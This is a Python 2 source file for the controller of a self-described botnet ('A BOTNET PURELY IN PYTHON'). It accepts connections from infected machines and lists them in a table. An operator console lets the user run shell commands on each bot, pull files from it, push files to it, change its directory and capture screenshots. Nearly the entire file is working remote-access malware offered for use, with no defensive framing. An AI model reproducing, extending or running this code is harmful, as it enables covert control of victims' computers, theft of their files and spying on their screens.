# -*- coding: utf-8 -*-
import socket
import os
from threading import Thread
from prettytable import PrettyTable
from colorama import Fore, Style
import time
import sys




server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

if len(sys.argv) != 3:
    print "Correct usage: script <IP address> <port number>"
    exit()
    
IP_address = str(sys.argv[1])
Port = int(sys.argv[2])

server.bind((IP_address, Port))
server.listen(50)


 
list_of_clientsocket = []
list_of_clientaddr = []

flag=True

imageno=1
bottable = PrettyTable(['INDEX','IP','PORT','OS'])



def session(conn):
    print ("\n \n")
    print ("==========================")
    print ("CONNECTED TO THE BOT")
    print ("==========================") 
    print(Fore.YELLOW)
    print("PRESS HELP FOR INSTRUCTIONS")
    print(Style.RESET_ALL)
    print ("\n")

    while True:
        
        command=raw_input("bot>")

        if 'exit' in command:
            print ("\n BACK TO MOTHERSHIP \n")
            return

        elif 'grab*' in command:
            try:
                transfergrab(conn,command)
            except:
                conn.close()
                remove(conn)
                return

        elif 'upload*' in command:
            
            try:
                
                transferupload(conn,command)
            except:
                conn.close()
                remove(conn)
                return
            
        elif 'cd*' in command:
            
            try:
                conn.send(command)
                shell=conn.recv(1024)
                while True:
                    print shell
                    if shell.endswith("DONE"):
                        break
                    shell=conn.recv(1024)
            except:
                conn.close()
                remove(conn)
                return
            
        elif 'screenshot' in command:
            try:
                screenshot(conn,command)
            except:
                conn.close()
                remove(conn)
                return
            
        
        
        elif 'shell*' in command:
            
            try:
                conn.send(command)
                shell=conn.recv(1024)
                while True:
                    print shell
                    if shell.endswith("DONE"):
                        break
                    shell=conn.recv(1024)
            except:
                conn.close()
                remove(conn)
                return
            
        elif 'help' in command:
            helpbot()
            
        else:
            print("INVALID COMMAND PRESS HELP FOR MORE INFO")




def remove(connection):
    
    if connection in list_of_clientsocket:
        x=list_of_clientsocket.index(connection)
        list_of_clientsocket.pop(x)
        print(Fore.RED)
        print ("[-] bot disconnected " + list_of_clientaddr[x][0] + "\n")
        print(Style.RESET_ALL)
        list_of_clientaddr.pop(x)
    
        
        

       
        
        




def mothership():
    global flag
    while True:
        command=raw_input("<mothership>")
      

        if 'showbots' in command:
            x=showbots()
            while x != 0:
                x=showbots()


        elif "connect" in command:
            a,b=command.split(" ")
            b=int(b)
            if b<len(list_of_clientaddr):
                session(list_of_clientsocket[b])
            else:
                print(Fore.RED)
                print("[-]index out of range TRY AGAIN (indexing starts from 0)")
                print(Style.RESET_ALL)
                
        elif "exit" in command:
            
            quitsafely()
            
                
        
        
        
        elif "help" in command:
            helpmothership()
                
            
        else:
            print("INVALID COMMAND PRESS HELP FOR MORE INFO")
        

        
        

def showbots():
    bottable.clear_rows()
    for x in range(len(list_of_clientsocket)):
        try:
            list_of_clientsocket[x].send('os')
            os=list_of_clientsocket[x].recv(1024)
            if os=='':
                return 1
        except:
            list_of_clientsocket[x].close()
            remove(list_of_clientsocket[x])
            return 1
            
        bottable.add_row([x,list_of_clientaddr[x][0],list_of_clientaddr[x][1],os]) 
    
    
    print ("CURRENTLY CONNECTED BOTS")
    print("----------------------------")    
    print bottable  
    return 0
        
        
        





def botconnect():
 
    global flag
    while flag:
         
        conn, addr = server.accept()
        list_of_clientsocket.append(conn)
        list_of_clientaddr.append(addr)
        print(Fore.GREEN)
        print("\n [+] incoming connection " + addr[0] + " connected")       
        print(Style.RESET_ALL)
       
        
          

def screenshot(conn,command):
    global imageno
    conn.send(command)
    
    filename="screenshot"+str(imageno)+".jpg"
    path=os.getcwd()+"/"
    path += filename
    
    f=open(path,'wb+')
    while True:
        bits=conn.recv(1024)
        f.write(bits)
                
        if bits.endswith('DONE'):
            
            print(Fore.GREEN)
            print("[+]screenshot saved at "+ path)   
            print(Style.RESET_ALL)
       
            
            f.close()
            break
    
    imageno+=1
            
	            
            
            
def transfergrab(conn,command):
    
    conn.send(command)
    grab,filename=command.split('*')
    path=os.getcwd()+"/"
    path += filename
    
    bits=conn.recv(1024)
    if "The File Doesn't Exist" in bits:
        
        print(Fore.RED)
        print("[-]The File Doesn't Exist")   
        print(Style.RESET_ALL)
            
    else:
        f=open(path,'wb+')
        while True:
            f.write(bits)
                
            if bits.endswith('DONE'):
                print(Fore.GREEN)
                print("[+]File Transfer Complete")   
                print(Style.RESET_ALL)
                
                f.close()
                break
            bits=conn.recv(1024)            
            

            
def transferupload(conn,command):
    print(Fore.YELLOW)
    print("[+] YOU HAVE INVOKED THE UPLOAD COMMAND")
    print("[+] THE FILE MUST BE IN YOUR CURRENT WORKING DIRECTORY")
    print(Style.RESET_ALL)
    upload,fname=command.split('*')
    if os.path.exists(fname):
        
        conn.send(command)
        print(Fore.BLUE)
        print("[+]UPLOADING")
        print(Style.RESET_ALL)
        
        f=open(fname,'rb')
        f.seek(0)
        packet=f.read(1024)
        while packet!='':
            conn.send(packet)
            packet=f.read(1024)
        conn.send("DONE")
        f.close()
        print(Fore.GREEN)
        print("[+]UPLOAD SUCCESSFULL")
        print(Style.RESET_ALL)
    else:
        print(Fore.RED)
        print("[-]The File Doesn't Exist")
        print(Style.RESET_ALL)
        
        
        
def quitsafely():
    ans=raw_input("\n ARE YOU SURE?(Y/N) ")
    if ans=='y' or ans=='Y':
        
        for conn in list_of_clientsocket:
            
            
            conn.send("SLEEP")
            x=list_of_clientsocket.index(conn)
            print ("going to sleep "+list_of_clientaddr[x][0] )
            conn.close()
                
        print(Fore.GREEN)
        print("\n --------------------------------------------------------------------------")
        print("ALL BOTS ARE SLEEPING IT IS SAFE TO QUIT/EXIT NOW.")
        print("EXIT WITHIN 100 SECONDS")
        print("after 100 sec bots will start attemptting connection again")
        print(" --------------------------------------------------------------------------")
        print(Style.RESET_ALL)
        
        print(Fore.RED)
        for remaining in range(100, 0, -1):
            sys.stdout.write("\r")
            sys.stdout.write("{:2d} seconds remaining.".format(remaining)) 
            sys.stdout.flush()
            time.sleep(1)
        print(Style.RESET_ALL)
        
        
        print("TIME OVER!!")
        print("DONT EXIT NOW")
        print("PRESS THE EXIT COMMAND AGAIN TO EXIT SAFELY")
        
        
     
    else:
        return
        
        
        
        
        

def graphics():

    print("\n \n ")
    print(" █████╗  █████╗ ██████╗  █████╗  ██████╗  ██████╗  ██████╗ ")
    print("██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝ ██╔═══██╗██╔════╝ ")
    print("███████║███████║██████╔╝███████║██║  ███╗██║   ██║██║  ███╗")
    print("██╔══██║██╔══██║██╔══██╗██╔══██║██║   ██║██║   ██║██║   ██║")
    print("██║  ██║██║  ██║██║  ██║██║  ██║╚██████╔╝╚██████╔╝╚██████╔╝")
    print("╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝  ╚═════╝ ")
    print("A BOTNET PURELY IN PYTHON                     BY NEIL TYAGI")
    print("                               EMAIL:tyagi.neil@hotmail.com")
    print("-----------------------------------------------------------")
    print("              (                  ")
    print("               )                 ")
    print("              (                  ")
    print("        /\  .-""-.  /\           ")
    print("       //\\/  ,,,  \//\\         ")
    print("       |/\| ,;;;;;, |/\|         ")
    print("       //\\\;-""-;///\\          ")
    print("      //  \/   .   \/  \\        ")
    print("     (| ,-_| \ | / |_-, |)       ")
    print("       //`__\.-.-./__`\\         ")
    print("      // /.-(() ())-.\ \\        ")
    print("     (\ |)   '---'   (| /)       ")
    print("      ` (|           |) `        ")
    print("     \)           (/             ")

    
    print(Fore.YELLOW)
    print("PRESS HELP FOR INSTRUCTIONS")
    print(Style.RESET_ALL)
    
    print("\n \n \n  ")
    
    
def helpmothership():
    
    
    print("+----------------+--------------------------------------+")
    print("|     COMMAND    | DESCRIPTION                          |")
    print("+----------------+--------------------------------------+")
    print("| showbots       | display table of connected bots      |")
    print("+----------------+--------------------------------------+")
    print("| connect <index>| connect to bot at a specified index  |")
    print("+----------------+--------------------------------------+")
    print("| exit           |exit the application(bots go to sleep)|")
    print("+----------------+--------------------------------------+")
    print("| help           | see this table                       |")
    print("+----------------+--------------------------------------+")  
    print("\n")

def helpbot():
    
    print("+-------------------+--------------------------------------------------------+")
    print("|      COMMAND      | DESCRIPTION                                            |")
    print("+-------------------+--------------------------------------------------------+")
    print("|        exit       | back to mothership(stay connected to the bot)          |")
    print("+-------------------+--------------------------------------------------------+")
    print("|        help       | see this table                                         |")
    print("+-------------------+--------------------------------------------------------+")
    print("|     screenshot    | take a screenshot of bot and save to cwd of mothership |")
    print("+-------------------+--------------------------------------------------------+")
    print("|  shell*<command>  | execute a shell command on bot                         |")
    print("+-------------------+--------------------------------------------------------+")
    print("|  grab*<file_name> | transfer a file from cwd of bot to cwd of mothership   |")
    print("+-------------------+--------------------------------------------------------+")
    print("| upload*<filename> | transfer a file from cwd of mothership to cwd of bot   |")
    print("+-------------------+--------------------------------------------------------+")
    print("|     cd*<path>     | change cwd of bot                                      |")
    print("+-------------------+--------------------------------------------------------+")
    
    







t1 = Thread(target = botconnect)

graphics()
t1.start()
mothership()






